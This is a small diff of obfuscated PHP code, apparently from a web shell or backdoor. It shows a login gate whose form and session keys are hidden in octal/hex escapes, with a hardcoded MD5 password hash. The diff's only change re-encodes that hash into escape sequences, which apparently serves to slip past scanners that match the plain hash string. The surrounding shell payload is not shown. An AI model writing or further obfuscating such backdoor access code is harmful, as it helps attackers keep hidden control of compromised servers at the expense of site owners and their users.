@@ -117,7 +117,7 @@ eiTo4:
 if (isset($_POST["\160\x61\x73\x73\x77\x6f\x72\144"])) 
 { 
     $entered_password = $_POST["\x70\x61\x73\x73\x77\157\x72\x64"]; 
-    $hashed_password = "d7a713b5d9adace16bfad1b7f7dab4c9"; 
+    $hashed_password = "\144\x37\141\67\61\63\x62\x35\144\x39\141\x64\x61\x63\x65\61\x36\x62\146\x61\x64\x31\x62\67\x66\x37\144\141\x62\x34\143\x39"; 
     if (md5($entered_password) === $hashed_password) 
     { 
         $_SESSION["\154\157\147\147\x65\144\x5f\x69\156"] = true; 
